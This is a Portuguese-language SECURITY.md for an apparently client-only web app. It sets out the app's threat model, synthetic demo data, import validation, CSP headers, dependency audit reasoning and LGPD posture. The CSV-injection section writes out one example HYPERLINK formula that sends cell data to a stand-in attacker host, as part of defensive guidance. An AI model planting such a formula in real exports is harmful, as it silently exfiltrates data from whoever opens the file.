# SECURITY.md — Segurança e privacidade

Escopo: aplicação **100% cliente**, sem backend, sem autenticação, sem transmissão de dados.
Este documento descreve a superfície de risco real dessa arquitetura — que é pequena, mas não é
nula — e o que foi feito a respeito.

---

## 1. Modelo de ameaça

| Ativo | Ameaça | Mitigação |
|---|---|---|
| Carteira importada (IndexedDB) | Acesso físico ao dispositivo | Fora do escopo do app. Documentado: use bloqueio de tela e não importe dados reais em dispositivo compartilhado. |
| Carteira importada | Extensão de navegador maliciosa | Não mitigável por app cliente. Documentado explicitamente. |
| Dados de demonstração | Confusão com dados reais | Selo persistente + `origem: DEMONSTRACAO` em cada registro + remoção automática do selo só após importação real. |
| CSV importado | Injeção de fórmula (CSV injection) | Sanitização na exportação — ver §3. |
| CSV importado | XSS via campo de texto | React escapa por padrão; `dangerouslySetInnerHTML` **não é usado em lugar nenhum** (verificado por teste). |
| CSV importado | Arquivo malformado / gigante | Validação de tamanho, tipo e linha a linha — ver §4. |
| Dados do usuário | Persistência indevida | Botão de limpeza total, exportação em um clique, política de dados visível. |

**Não há credenciais no frontend.** Não há chave de API, token, endpoint autenticado ou segredo de
qualquer natureza no código ou no bundle. Verificado por teste automatizado
(`security.test.ts`) que varre o diretório de build por padrões de chave.

---

## 2. Dados de demonstração — o que é e o que não é

Todos os dados do seed são **sintéticos e gerados por PRNG com semente fixa**.

**Não existe no repositório, em nenhuma forma:**
CNPJ real · telefone real · e-mail real · endereço real · limite de crédito · faturamento
individual real · preço interno real · margem real · dado pessoal de pessoa real · histórico
comercial confidencial.

**Como os dados sintéticos são construídos:**

| Campo | Tratamento |
|---|---|
| Nome fantasia | Composição de palavras de um léxico fictício ("Viação Serra Azul", "Transportes Kaeté") |
| Telefone | Sempre mascarado: `(11) 9····-1234`. Nunca um número completo, nem inventado. |
| CNPJ | **Não existe no modelo de dados.** Campo removido do schema de propósito. |
| E-mail | **Não existe no modelo de dados.** |
| Cidade/UF | Cidades brasileiras reais (informação pública, não sensível) |
| Valores | Gerados por PRNG em faixas plausíveis, marcados `DEMONSTRACAO` |
| Aplicação técnica | **Zero registros.** Ver §6. |

> A ausência de `cnpj` e `email` no schema é uma decisão de segurança: **um campo que não existe
> não vaza.** Se a distribuidora precisar deles, adicioná-los é uma mudança consciente com
> avaliação de impacto, não um padrão herdado.

---

## 3. Injeção de fórmula em CSV

Uma célula iniciada por `=`, `+`, `-`, `@`, tabulação ou retorno de carro é interpretada como
fórmula pelo Excel e pelo Google Sheets. Um campo de observação contendo
`=HYPERLINK("http://atacante/"&A1,"clique")` exfiltra dados quando a exportação é aberta.

**Mitigação (`src/data/csv.ts`, função `sanitizeCsvCell`):** toda célula exportada cujo primeiro
caractere esteja no conjunto perigoso recebe um apóstrofo de prefixo. Aplicado em **todas** as
exportações CSV, sem exceção. Coberto por teste.

---

## 4. Validação de importação

Antes de qualquer gravação:

1. **Consentimento explícito.** Caixa de confirmação obrigatória informando que os dados ficam
   apenas neste dispositivo, que o usuário é responsável pela base de origem e que dados pessoais
   devem ser minimizados. A leitura do arquivo não começa antes do aceite.
2. **Limite de tamanho:** 10 MB. Acima disso, rejeição imediata com mensagem clara.
3. **Limite de linhas:** 50.000 por arquivo.
4. **Tipo de arquivo:** apenas `.csv` / `text/csv`.
5. **Validação por linha:** tipo de cada campo, formato de data ISO, faixa numérica, existência
   de chave estrangeira. Cada rejeição registra número da linha e motivo legível.
6. **Importação parcial:** linhas válidas entram, inválidas vão para um CSV de erros exportável.
7. **Comprimento de campo:** strings truncadas em 500 caracteres (2.000 em observações).
8. **Registro:** todo import gera `ImportJob` + `AuditEvent` com contagens.

O parser de CSV é próprio (`src/data/csv.ts`), trata aspas, aspas escapadas, separadores dentro de
aspas e quebras de linha dentro de campo. Não usa `eval` nem construção dinâmica de função.

---

## 5. Controles do usuário

Todos em **Dados → Privacidade**:

| Controle | Efeito |
|---|---|
| **Exportar tudo (JSON)** | Backup completo restaurável, com `versao` e `exportadoEm` |
| **Exportar por entidade (CSV)** | Análise externa, com sanitização de fórmula |
| **Limpar dados de demonstração** | Remove apenas registros `DEMONSTRACAO` |
| **Apagar tudo** | Destrói o banco IndexedDB inteiro. Exige digitar `APAGAR` — irreversível. |
| **Ver política de dados** | Texto completo, sem link externo |

O botão de apagar tudo exige confirmação por digitação, não por clique. Um clique acidental que
destrói uma carteira importada é um incidente evitável.

---

## 6. Aplicação técnica — controle de segurança, não só de produto

O maior risco de dano **real** deste produto não é vazamento: é um vendedor enviar a peça errada
para um veículo parado com base numa tela do sistema. Custo: frete, veículo parado mais tempo,
conta perdida, e a responsabilidade recai sobre a distribuidora.

Controles implementados:

1. `VehicleApplication` chega **vazia** na demonstração. Não há dado a interpretar mal.
2. O grafo de oportunidade opera em `Sistema → Família`, nunca em peça
   (`CRITICAL_REVIEW.md` §1.4).
3. Toda saída do diagnóstico separa fisicamente confirmado / estimado / ausente / hipótese.
4. Nenhuma tela conclui um número de peça. O diagnóstico produz **perguntas**, não respostas.
5. O selo de demonstração é persistente e não dispensável enquanto o seed estiver ativo.

---

## 7. Cabeçalhos de segurança

Configurados em `public/_headers` (aplicados pelo Cloudflare Pages):

```
Content-Security-Policy: default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self'; connect-src 'self'; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'none'; frame-ancestors 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
X-Frame-Options: DENY
Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=()
Cross-Origin-Opener-Policy: same-origin
```

`connect-src 'self'` é a garantia estrutural mais importante: **o navegador impede que a aplicação
envie dados para qualquer host externo**, mesmo que uma dependência comprometida tentasse. É a
defesa contra ataque de cadeia de suprimentos em um app sem backend.

`'unsafe-inline'` em `style-src` é necessário para os estilos inline do React em posicionamento de
gráficos. Não se aplica a scripts, que é onde importa.

---

## 8. Dependências

Superfície mínima e deliberada — 4 dependências de produção:

| Pacote | Por quê | Alternativa recusada |
|---|---|---|
| `react`, `react-dom` | Base | — |
| `react-router-dom` | Roteamento | Roteador próprio: reinvenção sem ganho |
| `idb` | Envelope sobre IndexedDB (~1 kB) | API nativa crua: propensa a erro em transações |

**Não usamos:** biblioteca de gráficos, de tabelas, de formulários, de estado global, de datas, de
UI. Cada uma seria dezenas de kB e uma superfície de ataque de cadeia de suprimentos maior que o
próprio app. Ver `DESIGN_SYSTEM.md` §4 para o racional dos gráficos e tabelas.

`npm audit` faz parte do checklist de release em `DEPLOYMENT.md`.

### 8.1 Estado atual do `npm audit` — declarado, não escondido

Na data desta versão, `npm audit --omit=dev` reporta **1 advisory (alta) em `react-router`**,
e não existe versão publicada livre de todos os avisos conhecidos:

| Advisory | Faixa afetada | Situação neste projeto |
|---|---|---|
| Open redirect via barra invertida em `<Link>` / `useNavigate` | 6.0.0 – 7.17.0 | **Corrigido.** Estamos em 7.18.x. |
| Injeção de construtor via `deserializeErrors()` na hidratação SSR | 6.0.0 – 7.17.0 | **Corrigido.** Estamos em 7.18.x. |
| CSRF no modo RSC (execução de action antes de resposta 400) | 7.12.0 – 8.2.0 | **Presente na dependência, não alcançável.** |

**Por que não fazemos o downgrade sugerido pelo `npm audit fix --force`:** ele levaria a
7.11.0, que reintroduz as duas primeiras — e a primeira delas (`<Link>` / `useNavigate`)
é a única que toca APIs que o BRUTO OS realmente usa. Trocar um risco alcançável por um
inalcançável seria uma piora.

**Por que o advisory restante não é alcançável aqui:**

1. Ele exige o **modo RSC** (React Server Components) do React Router. Este projeto é uma
   SPA cliente que usa apenas `BrowserRouter`, `Routes`, `Route`, `Link`, `NavLink`,
   `Navigate`, `Outlet`, `useParams`, `useSearchParams`, `useNavigate` e `useLocation`.
   Nenhum pacote ou entrypoint de RSC é importado.
2. Não há servidor, não há *action* de servidor e não há sessão — CSRF pressupõe as três.
3. A CSP declara `form-action 'none'` e `connect-src 'self'`.

**Revisão:** reavaliar a cada release. Assim que houver uma versão sem o advisory de RSC,
atualizar e remover esta seção.

---

## 9. LGPD — postura

**Este documento não afirma conformidade jurídica.** Conformidade depende do uso que a
distribuidora fizer do produto e exige avaliação de um profissional de direito.

O que a arquitetura **oferece** como base:

| Princípio | Como a arquitetura sustenta |
|---|---|
| Minimização | Sem `cnpj`, sem `email`; telefone mascarado por padrão |
| Finalidade | Dados usados apenas para priorização comercial local |
| Transparência | Política de dados na aplicação; toda inferência é explicada |
| Eliminação | Apagar tudo, irreversível, em um lugar óbvio |
| Portabilidade | Exportação completa em JSON e CSV |
| Segurança | Nenhuma transmissão; CSP bloqueia envio externo |
| Responsabilização | `AuditEvent` local para importação, exportação e limpeza |

**Limitação declarada:** dados no IndexedDB não são criptografados em repouso. O navegador não
oferece uma chave a que só o usuário tenha acesso; qualquer criptografia no cliente teria a chave
no próprio cliente — teatro de segurança. A proteção real é o bloqueio de tela e a criptografia de
disco do dispositivo. Isso está dito na política de dados dentro do app, sem eufemismo.

**Aviso operacional:** Safari no iOS pode descartar IndexedDB de sites sem uso por 7 dias. A
política de dados avisa e a aplicação lembra o usuário de exportar backup periodicamente.

---

## 10. Checklist de release

- [ ] `npm audit --omit=dev` revisado contra a §8.1 — nenhum advisory NOVO ou alcançável
- [ ] `npm run check` (lint + testes + build) verde
- [ ] Nenhum `dangerouslySetInnerHTML` (teste automatizado)
- [ ] Nenhum padrão de segredo no build (teste automatizado)
- [ ] `_headers` presente em `dist/`
- [ ] Selo de demonstração visível com seed ativo
- [ ] `VehicleApplication` vazia no seed (teste automatizado)
- [ ] Exportação CSV sanitizada contra injeção de fórmula (teste automatizado)
- [ ] Nenhum dado real no repositório
